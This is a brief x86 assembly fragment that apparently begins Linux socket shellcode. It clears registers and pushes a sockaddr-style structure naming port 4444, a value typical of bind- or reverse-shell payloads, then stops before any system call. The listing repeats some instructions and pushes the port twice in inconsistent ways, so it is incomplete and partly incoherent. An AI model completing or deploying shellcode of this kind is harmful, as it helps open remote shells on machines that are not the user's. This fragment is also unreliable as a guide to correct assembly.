global _start
section .text
  _start:
    xor eax, eax
    xor ebx, ebx

    xor ebx, ebx
    mul ebx

    push word 0x5c11
    push word bx

    push dword 0x5c110002
